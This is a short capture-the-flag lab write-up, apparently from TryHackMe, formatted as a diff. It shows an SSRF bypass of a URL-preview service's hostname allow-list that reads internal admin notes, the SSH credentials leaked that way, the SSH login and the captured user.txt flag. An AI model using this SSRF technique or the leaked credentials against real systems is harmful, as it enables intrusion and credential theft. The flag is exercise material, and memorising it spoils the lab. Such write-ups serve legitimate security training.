@@ -198,4 +198,54 @@ def admin(p="index"):
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=80)
 
+The source hands me the whole exploit chain. Lets break down what it reveals, 
+
+The allow-list check (this is the key):
+
+python
+ALLOWED_HOSTS = {"kestrel.thm"}
+host = (urlparse(target).hostname or "").lower()
+if host not in ALLOWED_HOSTS: abort(403)
+
+It only forwards requests where the hostname is exactly kestrel.thm. And the comment tells me the trick: 
+“Internal hostname resolves to 127.0.0.1 via /etc/hosts on this box.” So on the target, kestrel.thm → 127.0.0.1. 
+That means a URL like http://kestrel.thm/admin/notes passes the allow-list and hits localhost.
+
+Let's put the theory to the test 
+curl -s "http://10.128.139.29/preview?url=http://kestrel.thm/admin/notes"
+
+Result: 
+
+</head>
+<body>
+<nav class="navbar">
+    <span class="brand">Volt Labs</span>
+    <span class="muted-light">URL Preview Service &middot; staging</span>
+</nav>
+<main class="container">
+        <div class="card">
+            <h2>Preview of http://kestrel.thm/admin/notes</h2>
+            <pre>&lt;pre>=== INTERNAL ===
+SSH access for staging:
+  user: webdev
+  pass: V0ltLabs#summer
+- Mara
+&lt;/pre></pre>
+        </div>
+        </main>
+<footer class="site">&copy; Volt Labs &middot; do not expose externally</footer>
+</body>
+</html>
+
+
+Look at that. I'm now able to target the admin notes as well as pull credentials 
+Let's see what ssh holds now 
+ssh webdev@10.128.139.29
+password: V0ltLabs#summer
+
+Password and username worked I'm now logged in as webdev@coldstart
+The user.txt file was found right when I logged in 
+THM{96dc7bd50d2fb98fcece01560788b5ab}
+user.txt found!
+
 
